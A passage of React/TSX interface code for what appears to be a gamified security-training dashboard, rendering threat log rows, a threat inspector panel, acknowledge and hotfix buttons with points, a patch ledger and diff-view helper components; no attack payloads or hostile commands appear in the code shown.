                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  height: 200,
                  gap: 12,
                }}
              >
                <div style={{ fontSize: 32, color: "#2a2a30" }}>◎</div>
                <div
                  style={{
                    fontSize: 12,
                    color: "#3a3a42",
                    fontWeight: 600,
                    letterSpacing: ".06em",
                  }}
                >
                  {filterTab === "acknowledged"
                    ? "NO ACKNOWLEDGED THREATS"
                    : filterTab === "fixed"
                      ? "NO PATCHED VULNERABILITIES YET"
                      : "NO EVENTS RECORDED"}
                </div>
              </div>
            )}
            {filteredLogs.map((log) => {
              const sev = SEV_CONFIG[log.severity];
              const tc = TYPE_COLORS[log.type];
              const isSel = selected === log.id;
              const isGP = patchedTypes.has(log.type);
              return (
                <div
                  key={log.id}
                  onClick={() => setSelected(isSel ? null : log.id)}
                  style={{
                    display: "grid",
                    gridTemplateColumns: "88px 82px 150px 1fr 110px",
                    alignItems: "center",
                    padding: "11px 24px",
                    borderBottom: "1px solid #16161a",
                    borderLeft: `3px solid ${isSel ? sev.dot : "transparent"}`,
                    background: isSel ? "#141418" : "transparent",
                    cursor: "pointer",
                    opacity: isGP ? 0.35 : 1,
                    transition: "background .1s",
                  }}
                  onMouseOver={(e) => {
                    if (!isSel) e.currentTarget.style.background = "#111115";
                  }}
                  onMouseOut={(e) => {
                    if (!isSel)
                      e.currentTarget.style.background = "transparent";
                  }}
                >
                  <span
                    style={{ fontSize: 11, color: "#4a4a52", fontFamily: mono }}
                  >
                    {fmt(log.ts)}
                  </span>
                  <div
                    style={{ display: "flex", alignItems: "center", gap: 6 }}
                  >
                    <div
                      style={{
                        width: 6,
                        height: 6,
                        borderRadius: "50%",
                        background: sev.dot,
                        flexShrink: 0,
                      }}
                    />
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: ".06em",
                        color: sev.color,
                      }}
                    >
                      {sev.label}
                    </span>
                  </div>
                  <div>
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: ".06em",
                        padding: "2px 7px",
                        borderRadius: 4,
                        color: tc.text,
                        background: tc.bg,
                        border: `1px solid ${tc.border}`,
                      }}
                    >
                      {TYPE_LABELS[log.type]}
                    </span>
                  </div>
                  <div
                    style={{
                      fontSize: 12,
                      color: "#6b6b70",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      paddingRight: 16,
                    }}
                  >
                    <span
                      style={{
                        color: sev.color,
                        fontWeight: 700,
                        marginRight: 7,
                      }}
                    >
                      {log.user}
                    </span>
                    {log.detail}
                  </div>
                  <div
                    style={{
                      display: "flex",
                      gap: 5,
                      justifyContent: "flex-end",
                    }}
                  >
                    {isGP && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 7px",
                          borderRadius: 4,
                          color: "#4ade80",
                          background: "rgba(74,222,128,.1)",
                          border: "1px solid rgba(74,222,128,.2)",
                          letterSpacing: ".06em",
                        }}
                      >
                        FIXED
                      </span>
                    )}
                    {!isGP && log.detected && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 7px",
                          borderRadius: 4,
                          color: "#38bdf8",
                          background: "rgba(56,189,248,.08)",
                          border: "1px solid rgba(56,189,248,.2)",
                          letterSpacing: ".06em",
                        }}
                      >
                        ACK
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* RIGHT: INSPECTOR */}
        <div
          style={{
            width: 420,
            flexShrink: 0,
            display: "flex",
            flexDirection: "column",
            background: "#111115",
            borderLeft: "1px solid #1e1e24",
          }}
        >
          <div
            style={{
              padding: "14px 22px",
              borderBottom: "1px solid #1e1e24",
              flexShrink: 0,
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
            }}
          >
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: ".12em",
                color: "#3a3a42",
              }}
            >
              THREAT INSPECTOR
            </span>
            {selectedLog && (
              <span
                style={{ fontSize: 10, color: "#4a4a52", fontFamily: mono }}
              >
                #{selectedLog.id}
              </span>
            )}
          </div>

          <div
            style={{
              flex: 1,
              overflowY: "auto",
              display: "flex",
              flexDirection: "column",
            }}
          >
            {!selectedLog ? (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  flex: 1,
                  gap: 12,
                  color: "#2a2a30",
                  textAlign: "center",
                  padding: 32,
                }}
              >
                <svg
                  width="40"
                  height="40"
                  viewBox="0 0 24 24"
                  fill="none"
                  style={{ opacity: 0.3 }}
                >
                  <path
                    d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
                    stroke="#e8e6e1"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="2"
                    stroke="#e8e6e1"
                    strokeWidth="1.5"
                  />
                </svg>
                <div
                  style={{
                    fontSize: 11,
                    fontWeight: 700,
                    letterSpacing: ".1em",
                    color: "#2a2a30",
                  }}
                >
                  SELECT A THREAT
                </div>
                <div style={{ fontSize: 11, color: "#2a2a30" }}>
                  Click any log row to inspect
                </div>
              </div>
            ) : (
              (() => {
                const sev = SEV_CONFIG[selectedLog.severity];
                const tc = TYPE_COLORS[selectedLog.type];
                const isGP = patchedTypes.has(selectedLog.type);
                const canAck = !selectedLog.detected && !isGP;
                const canPatch = selectedLog.detected && !isGP;
                return (
                  <div
                    style={{
                      padding: "20px 22px",
                      display: "flex",
                      flexDirection: "column",
                      gap: 16,
                    }}
                  >
                    <div
                      style={{
                        background: "#16161a",
                        border: `1px solid ${sev.dot}22`,
                        borderRadius: 10,
                        overflow: "hidden",
                      }}
                    >
                      <div
                        style={{
                          height: 3,
                          background: `linear-gradient(90deg, ${sev.dot}, transparent)`,
                        }}
                      />
                      <div style={{ padding: "16px 18px" }}>
                        <div
                          style={{
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            marginBottom: 10,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 10,
                              fontWeight: 700,
                              letterSpacing: ".08em",
                              padding: "2px 8px",
                              borderRadius: 4,
                              color: tc.text,
                              background: tc.bg,
                              border: `1px solid ${tc.border}`,
                            }}
                          >
                            {TYPE_LABELS[selectedLog.type]}
                          </span>
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 5,
                            }}
                          >
                            <div
                              style={{
                                width: 6,
                                height: 6,
                                borderRadius: "50%",
                                background: sev.dot,
                              }}
                            />
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: sev.color,
                                letterSpacing: ".06em",
                              }}
                            >
                              {sev.label}
                            </span>
                          </div>
                        </div>
                        <div
                          style={{
                            fontSize: 16,
                            fontWeight: 800,
                            color: sev.color,
                            marginBottom: 6,
                            letterSpacing: "-.01em",
                          }}
                        >
                          {selectedLog.user}
                        </div>
                        <div
                          style={{
                            fontSize: 12,
                            color: "#8b8480",
                            lineHeight: 1.65,
                            marginBottom: 14,
                          }}
                        >
                          {selectedLog.detail}
                        </div>
                        <div
                          style={{
                            display: "grid",
                            gridTemplateColumns: "1fr 1fr",
                            gap: 8,
                            background: "#0d0d10",
                            borderRadius: 7,
                            padding: 12,
                            marginBottom: 12,
                          }}
                        >
                          {[
                            ["SOURCE IP", selectedLog.ip],
                            ["COUNTRY", selectedLog.country],
                            ["ENDPOINT", selectedLog.endpoint],
                            ["METHOD", selectedLog.method],
                            ["PORT", String(selectedLog.port)],
                            ["STATUS", String(selectedLog.statusCode)],
                          ].map(([l, v]) => (
                            <div key={l}>
                              <div
                                style={{
                                  fontSize: 9,
                                  color: "#3a3a42",
                                  fontWeight: 700,
                                  letterSpacing: ".08em",
                                  marginBottom: 3,
                                }}
                              >
                                {l}
                              </div>
                              <div
                                style={{
                                  fontSize: 11,
                                  color: "#a0998f",
                                  wordBreak: "break-all",
                                  fontFamily: l === "SOURCE IP" ? mono : sans,
                                }}
                              >
                                {v}
                              </div>
                            </div>
                          ))}
                        </div>
                        <div
                          style={{
                            fontSize: 9,
                            color: "#3a3a42",
                            fontWeight: 700,
                            letterSpacing: ".08em",
                            marginBottom: 5,
                          }}
                        >
                          RAW PAYLOAD
                        </div>
                        <div
                          style={{
                            background: "#0d0d10",
                            border: "1px solid #1e1e24",
                            borderRadius: 6,
                            padding: "10px 12px",
                            fontSize: 11,
                            color: "#6b6b70",
                            whiteSpace: "pre-wrap",
                            wordBreak: "break-all",
                            lineHeight: 1.7,
                            fontFamily: mono,
                            maxHeight: 90,
                            overflowY: "auto",
                          }}
                        >
                          {selectedLog.payload}
                        </div>
                      </div>
                    </div>

                    {isGP ? (
                      <div
                        style={{
                          padding: "14px 16px",
                          background: "rgba(74,222,128,.06)",
                          border: "1px solid rgba(74,222,128,.18)",
                          borderRadius: 8,
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                        }}
                      >
                        <div
                          style={{
                            width: 20,
                            height: 20,
                            background: "rgba(74,222,128,.15)",
                            borderRadius: "50%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          <span style={{ fontSize: 10, color: "#4ade80" }}>
                            ✓
                          </span>
                        </div>
                        <div>
                          <div
                            style={{
                              fontSize: 12,
                              fontWeight: 700,
                              color: "#4ade80",
                              marginBottom: 2,
                            }}
                          >
                            Vulnerability Patched
                          </div>
                          <div style={{ fontSize: 11, color: "#4a6a52" }}>
                            {TYPE_LABELS[selectedLog.type]} is globally closed.
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div
                        style={{
                          display: "flex",
                          flexDirection: "column",
                          gap: 8,
                        }}
                      >
                        <div
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: 0,
                            marginBottom: 4,
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 6,
                            }}
                          >
                            <div
                              style={{
                                width: 20,
                                height: 20,
                                borderRadius: "50%",
                                background: selectedLog.detected
                                  ? "rgba(74,222,128,.15)"
                                  : "rgba(56,189,248,.15)",
                                border: `1px solid ${selectedLog.detected ? "rgba(74,222,128,.3)" : "rgba(56,189,248,.3)"}`,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                fontSize: 10,
                                fontWeight: 700,
                                color: selectedLog.detected
                                  ? "#4ade80"
                                  : "#38bdf8",
                              }}
                            >
                              {selectedLog.detected ? "✓" : "1"}
                            </div>
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: selectedLog.detected
                                  ? "#4ade80"
                                  : "#38bdf8",
                                letterSpacing: ".06em",
                              }}
                            >
                              ACKNOWLEDGE
                            </span>
                          </div>
                          <div
                            style={{
                              flex: 1,
                              height: 1,
                              background: selectedLog.detected
                                ? "rgba(74,222,128,.2)"
                                : "#1e1e24",
                              margin: "0 10px",
                            }}
                          />
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 6,
                            }}
                          >
                            <div
                              style={{
                                width: 20,
                                height: 20,
                                borderRadius: "50%",
                                background: canPatch
                                  ? "rgba(74,222,128,.15)"
                                  : "#1e1e24",
                                border: `1px solid ${canPatch ? "rgba(74,222,128,.3)" : "#2a2a30"}`,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                fontSize: 10,
                                fontWeight: 700,
                                color: canPatch ? "#4ade80" : "#3a3a42",
                              }}
                            >
                              2
                            </div>
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: canPatch ? "#4ade80" : "#3a3a42",
                                letterSpacing: ".06em",
                              }}
                            >
                              DEPLOY HOTFIX
                            </span>
                          </div>
                        </div>
                        <button
                          onClick={() => acknowledge(selectedLog.id)}
                          disabled={!canAck}
                          style={{
                            fontFamily: sans,
                            width: "100%",
                            padding: "12px 16px",
                            borderRadius: 8,
                            fontSize: 12,
                            fontWeight: 700,
                            letterSpacing: ".04em",
                            cursor: canAck ? "pointer" : "not-allowed",
                            border: "1px solid",
                            transition: "all .15s",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            ...(selectedLog.detected
                              ? {
                                  background: "rgba(74,222,128,.05)",
                                  borderColor: "rgba(74,222,128,.15)",
                                  color: "#4a6a52",
                                }
                              : {
                                  background: "rgba(56,189,248,.08)",
                                  borderColor: "rgba(56,189,248,.25)",
                                  color: "#38bdf8",
                                }),
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 8,
                            }}
                          >
                            <span style={{ fontSize: 14 }}>
                              {selectedLog.detected ? "✓" : "◉"}
                            </span>
                            <div style={{ textAlign: "left" }}>
                              <div>
                                {selectedLog.detected
                                  ? "Acknowledged"
                                  : "Acknowledge Threat"}
                              </div>
                              <div
                                style={{
                                  fontSize: 10,
                                  fontWeight: 400,
                                  color: selectedLog.detected
                                    ? "#3a5a42"
                                    : "#1a6080",
                                  marginTop: 1,
                                }}
                              >
                                {selectedLog.detected
                                  ? "Step 1 complete — proceed to hotfix"
                                  : "Mark as triaged to unlock hotfix"}
                              </div>
                            </div>
                          </div>
                        </button>
                        <button
                          onClick={() => openPatch(selectedLog.id)}
                          disabled={!canPatch}
                          style={{
                            fontFamily: sans,
                            width: "100%",
                            padding: "13px 16px",
                            borderRadius: 8,
                            fontSize: 12,
                            fontWeight: 700,
                            letterSpacing: ".04em",
                            cursor: canPatch ? "pointer" : "not-allowed",
                            border: "1px solid",
                            transition: "all .15s",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            ...(canPatch
                              ? {
                                  background: "rgba(74,222,128,.1)",
                                  borderColor: "rgba(74,222,128,.3)",
                                  color: "#4ade80",
                                }
                              : {
                                  background: "#0d0d10",
                                  borderColor: "#1e1e24",
                                  color: "#3a3a42",
                                }),
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 8,
                            }}
                          >
                            <span style={{ fontSize: 14 }}>
                              {canPatch ? "⚡" : "⟳"}
                            </span>
                            <div style={{ textAlign: "left" }}>
                              <div>Deploy Hotfix</div>
                              <div
                                style={{
                                  fontSize: 10,
                                  fontWeight: 400,
                                  color: canPatch ? "#15803d" : "#2a2a30",
                                  marginTop: 1,
                                }}
                              >
                                {canPatch
                                  ? "Opens code editor — fix the vulnerability"
                                  : "Acknowledge threat first"}
                              </div>
                            </div>
                          </div>
                          {canPatch && (
                            <div style={{ textAlign: "right" }}>
                              <span
                                style={{
                                  fontSize: 13,
                                  fontWeight: 800,
                                  color: "#4ade80",
                                }}
                              >
                                +{CHALLENGES[selectedLog.type]?.points || 0}
                              </span>
                              <div style={{ fontSize: 9, color: "#15803d" }}>
                                pts
                              </div>
                            </div>
                          )}
                        </button>
                      </div>
                    )}

                    {toast && (
                      <div
                        style={{
                          padding: "10px 14px",
                          borderRadius: 7,
                          fontSize: 12,
                          fontWeight: 600,
                          animation: "fadeup .2s ease",
                          ...(toast.ok
                            ? {
                                background: "rgba(74,222,128,.08)",
                                border: "1px solid rgba(74,222,128,.2)",
                                color: "#4ade80",
                              }
                            : {
                                background: "rgba(239,68,68,.08)",
                                border: "1px solid rgba(239,68,68,.2)",
                                color: "#f87171",
                              }),
                        }}
                      >
                        {toast.msg}
                      </div>
                    )}

                    <div>
                      <div
                        style={{
                          fontSize: 9,
                          color: "#2a2a30",
                          fontWeight: 700,
                          letterSpacing: ".1em",
                          marginBottom: 5,
                        }}
                      >
                        USER AGENT
                      </div>
                      <div
                        style={{
                          fontSize: 10,
                          color: "#4a4a52",
                          fontFamily: mono,
                          lineHeight: 1.6,
                          wordBreak: "break-all",
                        }}
                      >
                        {selectedLog.userAgent}
                      </div>
                    </div>
                  </div>
                );
              })()
            )}
          </div>

          {/* Score ledger */}
          <div style={{ borderTop: "1px solid #1e1e24", flexShrink: 0 }}>
            <div
              style={{
                padding: "11px 22px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                background: "#0d0d10",
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  fontWeight: 700,
                  letterSpacing: ".1em",
                  color: "#3a3a42",
                }}
              >
                PATCH LEDGER
              </span>
              <span style={{ fontSize: 10, color: "#2a2a30" }}>
                {scoreHistory.length} fixes
              </span>
            </div>
            <div style={{ maxHeight: 180, overflowY: "auto" }}>
              {scoreHistory.length === 0 ? (
                <div
                  style={{
                    padding: "16px 22px",
                    color: "#2a2a30",
                    fontSize: 11,
                    textAlign: "center",
                  }}
                >
                  No patches deployed yet
                </div>
              ) : (
                scoreHistory.map((h, i) => {
                  const tc = TYPE_COLORS[h.type];
                  return (
                    <div
                      key={i}
                      style={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                        padding: "10px 22px",
                        borderBottom: "1px solid #16161a",
                      }}
                    >
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div
                          style={{
                            fontSize: 10,
                            fontWeight: 700,
                            color: tc.text,
                            letterSpacing: ".06em",
                            marginBottom: 2,
                          }}
                        >
                          {TYPE_LABELS[h.type]}
                        </div>
                        <div
                          style={{
                            fontSize: 11,
                            color: "#4a4a52",
                            whiteSpace: "nowrap",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                          }}
                        >
                          {h.detail}
                        </div>
                        <div
                          style={{
                            fontSize: 10,
                            color: "#3a3a42",
                            marginTop: 2,
                            fontFamily: mono,
                          }}
                        >
                          {fmt(h.ts)}
                        </div>
                      </div>
                      <div
                        style={{
                          fontSize: 16,
                          fontWeight: 800,
                          color: "#4ade80",
                          marginLeft: 12,
                          letterSpacing: "-.02em",
                          fontFamily: mono,
                        }}
                      >
                        +{h.points}
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        </div>
      </div>

      <style jsx global>{`
        @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap");
        * {
          box-sizing: border-box;
        }
        body {
          margin: 0;
          background: #09090b;
          font-family: "Inter", system-ui, sans-serif;
          -webkit-font-smoothing: antialiased;
        }
        ::-webkit-scrollbar {
          width: 6px;
          height: 6px;
        }
        ::-webkit-scrollbar-track {
          background: transparent;
        }
        ::-webkit-scrollbar-thumb {
          background: #3f3f46;
          border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
          background: #52525b;
        }
        textarea:focus,
        button:focus {
          outline: none;
        }
        textarea {
          caret-color: #3b82f6;
        }
        textarea::selection {
          background: rgba(59, 130, 246, 0.2);
        }
        @keyframes pulse {
          0%,
          100% {
            opacity: 1;
          }
          50% {
            opacity: 0.4;
          }
        }
        @keyframes fadeup {
          from {
            opacity: 0;
            transform: translateY(4px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        @keyframes redflash {
          0% {
            opacity: 1;
          }
          100% {
            opacity: 0;
          }
        }
      `}</style>
    </div>
  );
}

// ─── Pure helper components to keep render fns clean ─────────────────────────
function DiffHeader({
  label,
  color,
  top = false,
}: {
  label: string;
  color: string;
  top?: boolean;
}) {
  return (
    <div
      style={{
        padding: "10px 20px",
        fontSize: 10,
        fontWeight: 700,
        letterSpacing: ".1em",
        color,
        borderBottom: `1px solid ${color}26`,
        ...(top ? { borderTop: `1px solid ${color}26`, marginTop: 12 } : {}),
        background: `${color}0a`,
      }}
    >
      {label}
    </div>
  );
}

function DiffLine({
  line,
  num,
  bad,
}: {
  line: string;
  num: number;
  bad: boolean;
}) {
  return (
    <div style={{ display: "grid", gridTemplateColumns: "44px 1fr" }}>
      <span
        style={{
          color: "#52525b",
          padding: "0 12px",
          textAlign: "right",
          userSelect: "none",
          fontSize: 11,
        }}
      >
        {num}
      </span>
      <span
        style={{
          whiteSpace: "pre-wrap",
          wordBreak: "break-all",
          paddingRight: 20,
          background: bad ? "rgba(248,113,113,0.13)" : "transparent",
          color: bad ? "#fca5a5" : "#71717a",
        }}
      >
        {line || " "}
      </span>
    </div>
  );
}

function DiffFixLine({ line }: { line: string }) {
  return (
    <div style={{ display: "grid", gridTemplateColumns: "44px 1fr" }}>
      <span
        style={{
          color: "#10b981",
          padding: "0 12px",
          textAlign: "right",
          opacity: 0.5,
          fontSize: 11,
        }}
      >
        +
      </span>
      <span
        style={{
          whiteSpace: "pre-wrap",
          color: "#86efac",
          background: "rgba(74,222,128,0.08)",
          paddingRight: 20,
        }}
      >
        {line || " "}
      </span>
    </div>
  );
}
